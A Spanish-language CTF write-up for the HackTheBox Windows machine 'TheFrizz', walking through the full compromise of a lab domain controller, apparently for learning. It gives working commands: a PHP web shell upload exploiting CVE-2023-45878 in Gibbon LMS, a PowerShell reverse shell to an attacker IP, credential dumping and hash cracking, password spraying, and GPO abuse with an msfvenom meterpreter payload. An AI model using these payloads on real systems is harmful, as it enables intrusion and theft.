---
layout: single
title: "Machines - TheFrizz (HTB)"
author_profile: true
published: true
toc: true
toc_sticky: true
---

Las máquinas (de HackTheBox) son retos gamificados enfocados a __Red Team__ o por lo menos, __seguridad ofensiva__, donde tendrás que intentar __tomar control total__ de la máquina que tengas adelante abusando de vulnerabilidades practicando todo el proceso de _pentesting_ como la _obtención de información_, _explotación_ para obtener un _Foothold_, y luego seguir con generalmente, _movimiento lateral_ y finalmente, la _escalada de privilegios_; Estos laboratorios son especialmente útiles para probar conceptos de seguridad ofensiva ya que tendrás que abusar de ellos para seguir avanzando.

![UTMP]({{ "/images/TheFrizz/logo.png" | relative_url }}){: .align-center}

## Resumen TheFrizz

Para inciar, en esta máquina __Windows__ estaremos utilizando el siguiente path de ataque:

1. __Enumeración__ - Lo mismo de siempre para iniciar nuestra máquina igual, nos puede servir para buscar vulnerabilidades en los componentes del servidor web.
2. __Explotación CVE-2023-45878__ - Una vulnerabilidad de _Arbitrary File Write_, perfecta para subir una web shell.
3. __Enumeración y Dumpeo de MySQL__ - Dumpeo de la base de datos MySQL para crackear hashes de usuarios.
4. __Foothold y Enumeración__ - Enumeración inicial del sistema, encontrando un archivo en la papelera de reciclaje.
5. __PE - Abuso de membership__ - Como miembros de '_Group Policy Creator Owners_' podemos crear un GPO para escalar privilegios.

Ahora que lo escribo, suena muy resumido pero a grandes rasgos, funciona bastante bien para entender lo que hacemos en la máquina.

## Laboratorio

### Enumeración

Iniciamos la enumeración típica con `nmap` con las siguientes configuraciones:


```bash
❯ nmap -p- --min-rate 5000 -n -Pn 10.10.11.60 --open -oG allports
```

* `-p-` Indica el escaneo de los 65,535 puertos
* `--min-rate 5000` Indica la velocidad de transmisión de paquetes (a una tasa mínima de 5,000 paquetes por segundo)
* `-n` Deshabilita la resolución DNS de la IP
* `-Pn` Deshabilita el reconocimiento con icmp que realiza `nmap` para determinar si el host está activo o no
* `10.10.11.60` La IP objetivo
* `-oG allports` Indica un archivo de salida en formato grepeable (facilita mucho el utilizar bash para la extracción de información del archivo)

_Nota: He de aclarar, que el `--min-rate` acelera bastante el escaneo, pero claro, __es muy ruidoso, y es muy estresante para la red__; si el ancho de banda es limitado, mejor utiliza otra configuración o velocidad (`-T`), otro detalle es que puede lanzar falsos negativos, reportando como closed algunos puertos realmente abiertos, para que lo tengan en cuenta_


Ahora, con la primera salida de puertos abiertos, realizamos un segundo escaneo esta vez para enumerar sus versiones junto con algunas revisiones que puede hacer `nmap`

```js
❯ nmap -p22,53,80,135,139,389,445,464,593,636,3268,3269,9389,49664,49667,49670,59091,59095,59105 -sCV -Pn -n 10.10.11.60 -oN OpenPorts
```

* `-p22,53...` Limita el escaneo a los puertos en específico
* `-sCV` Son 2 flags combinadas de nmap (-sC) para la ejecución de scripts por defecto de nmap (mayor información) y (-sV) para determinar la versión del servicio
* `-oN OpenPorts` Indica que el output del comando lo reporte en un formato nmap, la salida de lo que veas en consola será lo que verás en el archivo.


Y tenemos la siguiente salida.

```js
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-31 18:51 CST
Nmap scan report for 10.10.11.60
Host is up (0.33s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
59091/tcp open  msrpc         Microsoft Windows RPC
59095/tcp open  msrpc         Microsoft Windows RPC
59105/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| smb2-time: 
|   date: 2025-09-01T07:52:44
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.13 seconds
```

Si presan atención al _Did not follow redirect to_ viene un nombre de dominio, pero, nuestra máquina no sabrá cómo resolver `frizzdc.frizz.htb`, entonces, necesitamos ingresar la dirección IP junto con el nombre del subdominio y del dominio (Preferible en este orden, ya que suele causar problemas en ciertos casos).

```js
❯ nano /etc/hosts

<Snip!>
# Others
10.10.11.60 frizzdc.frizz.htb frizz.htb 
```

Y ya configurado, podremos acceder al servidor web.

![UTMP]({{ "/images/TheFrizz/web.png" | relative_url }}){: .align-center}

Enumerando poco a poco la página, encontramos una nota con la versión del framework de la página en `http://frizzdc.frizz.htb/Gibbon-LMS/#`

![UTMP]({{ "/images/TheFrizz/gibbonv.png" | relative_url }}){: .align-center}


### Explotación CVE-2023-45878


Si buscamos las vulnerabilidades de la aplicación, encontraremos que tiene vulnerabilidades _Local File Inclusion_ y _Arbirary File Write_, en el siguiente [reporte](https://herolab.usd.de/en/security-advisories/usd-2023-0025/) podremos encontrar el PoC para la _web shell_ __utilizando php__.

En un archivo, ingresamos la _web shell de PHP_, puede ser el típico one liner para la sencillez del payload:

```php
<?php system($_GET['cmd']);?>
```

Luego, lo codificamos en `base64`

```bash
❯ base64 -w0 webshell.php
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4K
```

Y luego confirmamos el endpoint vulnerable con curl, podemos enviar una petición tipo `POST` o una `GET`, en cualquier caso, deberíamos de notar las diferentes respuestas si existe o no:

![UTMP]({{ "/images/TheFrizz/curl.png" | relative_url }}){: .align-center}

Como podemos notar, gracias a que no recibimos respuesta del servidor (no fue un 404), es un indicativo que el recurso existe, pero no devuelve nada y eso es hasta esperado.


_Nota: dado que estamos subiendo una web shell, en un assessment real, no se recomienda poner nombres descritivos o sencillos, por ello, podemos utilizar por ejemplo `uuidgen` para generar una cadena un poco randomizada y larga difícil de predecir y sea más seguro trabajar con ella_


Ahora; ya con todo, podemos explotar el servicio y obtener una web shell, Utilizando `curl` podemos subir nuestra web shell con la siguiente petición:

```bash
❯ curl -X POST http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php -d "img=image/png;61d59b0f4294,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4K%2b&path=61d59b0f4294.php&gibbonPersonID=0000000001"
```

Y podremos confirmar que se ha subido si visitamos el archivo desde __el root de la instalación gibbon__:

![UTMP]({{ "/images/TheFrizz/created.png" | relative_url }}){: .align-center}

Y para usarla, sólo necesitamos utilizar el parámetro `cmd` y el comando a utilizar:

![UTMP]({{ "/images/TheFrizz/executed.png" | relative_url }}){: .align-center}

### Enumeración y Dumpeo de MySQL

Ahora, ya con un método de ejecución de comandos, por comodidad prefiero moverme en una reverse shell; hay un payload oneliner de powershell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<IP ATACANTE>',<PUERTO>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Si queremos ejecutarlo desde esta instancia; sólo debemos indicar que queremos que powershell lo ejecute (`powershell.exe -c `) poner todo el comando entre comillas y finalmente, codificarlo en URL para que funcione la ejecución:

```bash
http://frizzdc.frizz.htb/Gibbon-LMS/61d59b0f4294.php?cmd=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.14.2%27%2C11601%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

Este comando abre una __sesión interactiva de powershell__ utilizando el `System.Net.Sockets` y establece una conexión TCP hacia la dirección y puerto indicado, también se crea un stream asociado al socket de conexión que puedes verlo como un tunel donde envías datos (los comandos, que se ejecutan con `iex` o `Invoke-Expression`) y recibes datos (la salida del comando ejecutado es capturado y enviado en el stream).

Antes de ejecutarlo (no olvides indicar tu IP de atacante y el puerto), ponemos a la escucha el `netcat` y recibir la shell.

```bash
❯ nc -nlvp 11601
Listening on 0.0.0.0 11601
```

Y ya en el momento de haber levantado el `netcat` realiza la petición y verás que tienes tu sesión interactiva de powershell:


```bash
❯ nc -nlvp 11601
Listening on 0.0.0.0 11601
Connection received on 10.10.11.60 54750

PS C:\xampp\htdocs\Gibbon-LMS> dir


    Directory: C:\xampp\htdocs\Gibbon-LMS


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/20/2023   6:04 AM                i18n
d-----         1/20/2023   6:04 AM                installer
d-----         1/20/2023   6:04 AM                lib
d-----         1/20/2023   6:04 AM                modules
d-----         1/20/2023   6:04 AM                resources
<SNIP>
-a----        10/11/2024   8:15 PM           1307 config.php
```

En los directorios que muestra; nota el `config.php`, siempre revisa este tipo de archivos ya que pueden contener credenciales:

```php
PS C:\xampp\htdocs\Gibbon-LMS> type config.php

<SNIP>
/**
 * Sets the database connection information.
 * You can supply an optional $databasePort if your server requires one.
 */
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
<SNIP>
```

Dicho y hecho, tenemos credenciales para la base de datos; ahora, sólo tenemos que ubicarla; Por lo general, la encontrarás en `C:\xampp\mysql`; esto para utilizar el ejecutable y poder ejecutar comandos para escarbar más credenciales:

![UTMP]({{ "/images/TheFrizz/dir.png" | relative_url }}){: .align-center}

Ya con el ejecutable, nos podemos conectar a mysql; ahora, recuerda lo que dije de la sesión interactiva, no funciona como una shell totalmente, por lo que no nos permitirá tener una sesión interactiva en mysql; pero sí que hay una forma de hacer consultas:

```powershell
PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e '';
```

En las comillas simples, sólo hace falta el comando que quieras ejecutar; podemos iniciar enumerando las tablas:

```js
PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'show tables';
Tables_in_gibbon
gibbonaction
gibbonactivity
gibbonactivityattendance
gibbonactivityslot
gibbonactivitystaff
gibbonactivitystudent
gibbonactivitytype
gibbonadmissionsaccount
gibbonadmissionsapplication
gibbonalarm
gibbonalarmconfirm
gibbonalertlevel
gibbonapplicationform
<SNIP>
```

Como notarás, son un montón de tablas, lo que podemos hacer es buscar en tablas con nombres tentadores como lo es `gibbonperson`; 

Si hacemos un describe veremos que a parte de ser un montón de columnas, también hay unas que nos pueden interesar mucho:

![UTMP]({{ "/images/TheFrizz/describe.png" | relative_url }}){: .align-center}

Entonces, hacemos la consulta para que nos muestre sólo esos campos:

```js
PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'SELECT username, passwordstrong, passwordstrongsalt from gibbonperson';
username        passwordstrong  passwordstrongsalt
f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489
```

Ahora, las podemos crackear con hashcat copiándo el hash y el salt en un archivo, dada la extensión del password, hay una fuerte probabilidad de que sea sha256 por lo que tendremos que ajustar hashcat conforme a ello. Para hacer el archivo, sólo tienes que poner la salt y el password separado por dos puntos `:` ya que `hashcat` detectará el formato `pass:salt` sea cual sea el modo que escojamos.

```
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489
```

Y hacemos que hashcat haga su recomendación (en la nueva versión de hashcat, si no seleccionamos un modo, tratará de detectar cuál es).

```bash
❯ hashcat hashes.dump /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 4700U with Radeon Graphics, 2599/5263 MB (1024 MB allocatable), 8MCU

The following 12 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1410 | sha256($pass.$salt)                                        | Raw Hash salted and/or iterated
   1420 | sha256($salt.$pass)                                        | Raw Hash salted and/or iterated
<SNIP>
```

Ahora, podremos probar con ambos por si da algún resultado, pero sólo utilizando el `1420` nos dará nuestra contraseña:

```bash
❯ hashcat -m 1420 hashes.dump /usr/share/wordlists/rockyou.txt
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23
```

Ahora, con la contraseña y el usuario, utilizamos `getTGT.py` ya que _kerberos_ __seguramente estará interactuando con ssh__, `Kerberos` para recordar, es un protocolo de autenticación basado en tickets; existen 2: los `TGT` que sirven principalmente para autenticar a un usuario, los `ST` que sirve para que un usuario utilice un servicio: ahora, si intentamos acceder a SSH, nos dará un error y eso es por que `Kerberos` está pensado para ser una solución centralizada; entonces, necesitamos primero un __TGT para pedir a kerberos un ST para acceder mediante SSH__.

Como mencionamos anteriormente, utilizamos `getTGT.py` pero...

```js
❯ getTGT.py frizz.htb/f.frizzle:Jenni_Luvs_Magic23
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Eso es por el NTP, para resolverlo sólo necesitamos sincronizar con respecto al DC con el siguiente comando:

```js
 ❯ sudo ntpdate -v frizz.htb
2025-09-01 04:18:50.986456 (-0600) +25200.926809 +/- 0.115606 frizz.htb 10.10.11.60 s1 no-leap
CLOCK: time stepped by 25200.926809
```

Y confirmarás que funciona:

```js
❯ getTGT.py frizz.htb/f.frizzle:Jenni_Luvs_Magic23
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in f.frizzle.ccache
```

Y podemos exportarlo en el comando que utilicemos con `ssh` (agregando el `-K` para indicar autenticación por kerberos):

```js
❯ KRB5CCNAME=f.frizzle.ccache ssh -K f.frizzle@frizzdc.frizz.htb
f.frizzle@frizzdc.frizz.htb: Permission denied (gssapi-with-mic,keyboard-interactive).
```

Pero si te pasa como a mi, te podría dar un error. Esto tiene múltiples causas:

* Configuración DNS: Asegúrate que en el `/etc/hosts`, __esté especificado el FQDN y luego el nombre del dominio__:

```js
❯ cat /etc/hosts

<Snip!>
# Others
10.10.11.60 frizzdc.frizz.htb frizz.htb 
```

* Configuración del `/etc/krb5.conf`: Este archivo es una configuración para máquinas linux que estén en un dominio, en ella se indica el REALM en el que está, configuraciones internas específicas como DNS para encontrar el `KDC` (Key Distribution Center, que es el componente de `kerberos` para emitir los tickets); __esto principalmente afecta cuando quieres utilizar herramientas como SSH__ Si modificas este archivo, debes tenerlo en cuenta cuando vuelvas a un entorno de active directory o te causará problemas como el de SSH, pues internamente ve la configuración, y si los datos no están correctos, no puede pedir la emisión del `TS` para acceder al servidor mediante `SSH`. El archivo debería ser como el siguiente:

```json
[libdefaults]
    default_realm = FRIZZ.HTB

[realms]
    FRIZZ.HTB = {
        kdc = frizzdc.frizz.htb
    }

[domain_realm]
    .frizz.htb = FRIZZ.HTB
    frizz.htb = FRIZZ.HTB

```

Una vez revisado ambas cosas, te debería permitir entrar y revisar la flag en Desktop:

```java
PS C:\Users\f.frizzle> ls .\Desktop\

    Directory: C:\Users\f.frizzle\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar--            9/1/2025  4:01 AM             34 user.txt
```

### Foothold y Enumeración

Mientras enumeramos el sistema, notaremos tarde o temprano `C:\$RECYCLE.BIN` (para listarlo, utiliza `ls -force` desde `C:\`) y dentro de él, encontraremos 3 archivos:

![UTMP]({{ "/images/TheFrizz/recycle.png" | relative_url }}){: .align-center}

Pero en realidad, 2 de ellos, son _básicamente el mismo_: Cuando se __elimina un archivo__ y es mandado al recycle bin, se renombra __con un prefijo $R/$I__ El archivo R es en sí, el archivo borrado, mientras que el archivo I, es la información de ese archivo; Si queremos saber más detalles del archivo borrado, sólo tenemos que ver el contenido del `$I`:

```js
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> type '.\$IE2XMEG.7z'
<C:\Users\f.frizzle\AppData\Local\Temp\wapt-backup-sunday.7z
```

No hay necesidad de restaurar el archivo, pero sí de moverlo a nuestra máquina para examinarlo más a fondo, así que utilizamos `scp` para copiar el archivo remoto a nuestra máquina:

```js
KRB5CCNAME=f.frizzle.ccache scp f.frizzle@frizzdc.frizz.htb:C:/\$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/E2XMEG.7z ./E2XMEG.7z
```

Después de descomprimir el archivo; podemos buscar en configuraciones por si existe alguna otra contraseña... donde justo en `/wapt/conf/waptserver.ini` encontramos algo:

```bash
[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log
```

Donde notaremos el `=` lo que potencialmente nos dice que es un base64:

```bash
❯ echo "IXN1QmNpZ0BNZWhUZWQhUgo=" | base64 -d
!suBcig@MehTed!R
```

Una vez con credenciales, debemos averiguar de quién es la clave; por lo que tendremos que enumerar primero a los usuarios locales y hacer un password spray:

```java
PS C:\Users\f.frizzle> NET USERS

User accounts for \\

-------------------------------------------------------------------------------
a.perlstein              Administrator            c.ramon
c.sandiego               d.hudson                 f.frizzle
g.frizzle                Guest                    h.arm
J.perlstein              k.franklin               krbtgt
l.awesome                m.ramon                  M.SchoolBus
p.terese                 r.tennelli               t.wright
v.frizzle                w.li                     w.Webservice
```

Ahora, creamos el archivo como una lista con los nombres y podemos utilizar `kerbrute`


```js
❯ kerbrute_linux_amd64 passwordspray -d frizz.htb --dc 10.10.11.60 content/users.txt '!suBcig@MehTed!R'

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 09/01/25 - Ronnie Flathers @ropnop

2025/09/01 06:35:37 >  Using KDC(s):
2025/09/01 06:35:37 >   10.10.11.60:88

2025/09/01 06:35:39 >  [+] VALID LOGIN:  M.SchoolBus@frizz.htb:!suBcig@MehTed!R
2025/09/01 06:35:39 >  Done! Tested 20 logins (1 successes) in 1.593 seconds

```

### PE - Abuso de membership


Ahora, con un hit del usuario `M.SchoolBus` podemos autenticarnos con `SSH` de la misma forma que lo hicimos con `f.frizzle`

```js
❯ getTGT.py frizz.htb/M.SchoolBus:'!suBcig@MehTed!R'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in M.SchoolBus.ccache

❯ KRB5CCNAME=M.SchoolBus.ccache ssh -K M.SchoolBus@frizzdc.frizz.htb

```

Y enumerando como siempre, tenemos un grupo muy interesante:

![UTMP]({{ "/images/TheFrizz/PE.png" | relative_url }}){: .align-center}

`Group Policy Creator Owners` Que garantiza el crear Objetos de Políticas de Grupo; abusable para escalar privilegios. El path es el siguiente: Crear una política, linkearla con el dominio; y utilizando `SharpGPOAbuse` podemos ejecutar una tarea para obtener acceso (si no lo tienen, lo pueden [descargar acá](https://github.com/FSecureLABS/SharpGPOAbuse)). Solo es copiar y pegar el ejecutable en su directorio actual y montan un servidor http para que puedan descargarlo de forma remota (o utilizar scp).


En la máquina local
```bash
❯ python3 -m http.server 11602
```

En el objetivo:


```powershell
Invoke-WebRequest http://attacker-ip:11602/SharpGPOAbuse.exe -Outfile SharpGPOAbuse.exe
```

Con ello ejecutamos:


```bash
PS C:\Users\M.SchoolBus\Desktop> New-GPO -name "AbussingGPO"

DisplayName      : AbussingGPO
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
Id               : 4e887bb3-30b2-468a-80e8-e599e309de21
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 9/1/2025 5:46:04 AM
ModificationTime : 9/1/2025 5:46:04 AM
UserVersion      :
ComputerVersion  :
WmiFilter        :

PS C:\Users\M.SchoolBus\Desktop> New-GPLINK -name "AbussingGPO" -target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB"

GpoId       : 4e887bb3-30b2-468a-80e8-e599e309de21
DisplayName : AbussingGPO
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=frizz,DC=htb
Order       : 2
```

Ahora una pequeña explicación de nuestro abuso, el usuario `M.SchoolBus` pertenece a un grupo que permite crear políticas en el dominio, al crear la GPO es propietario de ella, pero __cuando se aplica__ al _Domain Controller_ se ejecutan por el _servicio de cliente de directivas de grupo_ `gpsvc` (ejecutada por NT AUTHORITY\SYSTEM); por eso se suele abusar de ello para la ejecución con privilegios máximos. Finalmente, `SharpGPOAbuse` añade una tarea programada (tú la creaste, tú puedes 'añadir' lo que quieras) para ejecutar un programa o comando; __existen muchas más alternativas, como crear una cuenta y añadirla a admins__, __cambiar la contraseña del administrador de dominio__ (_esta cuenta tiene soporta 2 contraseñas de 'rotación'; así que un sólo cambio, no afectará totalmente las operaciones_) entre muchas otras alternativas!.

Entendiendo esto, ahora programamos una tarea programada para recibir nuestra shell con privilegios elevados (puedes hacerlo con cualquier método, por ejemplo, `metasploit`):

Primero creas el payload tipo `exe`

```bash
❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=Attacker-IP LPORT=PORT -f exe -o backup.exe
<SNIP>
❯ python3 -m http.server PORT
```

Y en otra ventana preparas el listener de metasploit:

```js
❯ msfconsole -q
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 11603
LPORT => 11603
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST tun0
LHOST => tun0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
```

Lo transfieres con el método dicho anteriormente (ptyhon) y programas la tarea con la GPO:

```js
PS C:\Users\M.SchoolBus\Desktop> Invoke-WebRequest http://IP:PORT/backup.exe -outfile backup.exe
PS C:\Users\M.SchoolBus\Desktop> .\SharpGPOAbuse.exe --AddComputerTask --GPOName "AbussingGPO" --Author "randname" --taskname "Session" --Command "powershell.exe" --Arguments ' -c C:\Users\M.SchoolBus\Desktop\backup.exe'
```

Luego, __forzamos la carga del GPO__ y obtendremos nuestra shell!

```java
PS C:\Users\M.SchoolBus\Desktop> gpupdate /force                                                                                                                                                              Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

Y en nuestra consola de `metasploit`...

```bash
[*] Sending stage (177734 bytes) to 10.10.11.60
[*] Meterpreter session 2 opened (10.10.14.2:11603 -> 10.10.11.60:53790) at 2025-09-01 07:02:22 -0600

(Meterpreter 2)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
```

Sólo revisa `C:\Users\Administrator\Desktop`

```js
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D129-C3DA

 Directory of C:\Users\Administrator\Desktop

03/11/2025  04:14 PM    <DIR>          .
03/11/2025  03:37 PM    <DIR>          ..
02/25/2025  03:06 PM             2,083 cleanup.ps1
09/01/2025  04:01 AM                34 root.txt
               2 File(s)          2,117 bytes
               2 Dir(s)   1,906,348,032 bytes free

C:\Users\Administrator\Desktop>type root.txt
```

Dominio Secuestrado!

###### Agradecimiento

Si lees esto, gracias por llegar hasta aquí!, si existen dudas, comentarios y correcciones (que son más que bienvenidas) contáctame con confianza, que siempre he dicho que la ciberseguridad es esfuerzo conjunto. 

En caso que no los vea, buenos días, buenas tardes y buenas noches. Happy Hacking!.
